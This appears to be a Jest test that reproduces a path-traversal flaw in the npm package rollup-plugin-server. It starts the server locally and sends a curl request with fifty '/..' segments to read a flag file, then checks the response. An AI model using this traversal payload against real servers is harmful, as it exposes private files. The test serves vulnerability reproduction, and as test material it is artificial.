
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in rollup-plugin-server", (done) => {
  const server = require("rollup-plugin-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  server({
    host: 'localhost',
    port: 9000
  });

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${genstr()}"`;

  exec(attack_string, (error, stdout) => {
  expect(stdout).toBe(hostsFile);
  done();
  });
});